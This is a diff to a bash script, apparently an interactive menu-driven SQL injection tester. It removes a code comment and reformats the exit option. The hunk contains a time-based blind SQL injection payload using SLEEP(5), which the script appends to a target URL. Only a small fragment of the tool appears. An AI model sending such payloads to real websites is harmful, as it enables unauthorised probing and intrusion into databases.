@@ -32,7 +32,6 @@ while true; do
             sleep 1
             
             PAYLOAD="1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"
-            # Logika URL handling biar ga double '1'
             if [[ "$target_url" == *"="* ]]; then
                 TEST_URL="${target_url}${PAYLOAD}"
             else
@@ -70,9 +69,7 @@ while true; do
             echo ""
             read -p "Press Enter to continue..."
             ;;
-        4)
-            exit 0
-            ;;
+        4) exit 0 ;;
         *) echo -e "${R}[!] Invalid choice.${N}"; sleep 1 ;;
     esac
 done
